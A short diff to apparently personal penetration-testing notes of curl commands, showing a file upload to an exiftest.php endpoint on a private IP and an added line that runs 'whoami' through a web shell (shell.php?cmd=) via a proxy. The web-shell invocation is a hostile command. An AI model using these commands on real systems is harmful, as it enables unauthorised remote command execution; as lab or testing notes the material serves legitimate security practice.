@@ -3,3 +3,5 @@
 #Uploading File with Filename myFile
 curl -F myFile=@test.jpg http://192.168.208.183/exiftest.php
 
+#curl with proxy
+curl "http://127.0.0.1:8080/shell.php?cmd=whoami" --proxy 192.168.120.223:3128 
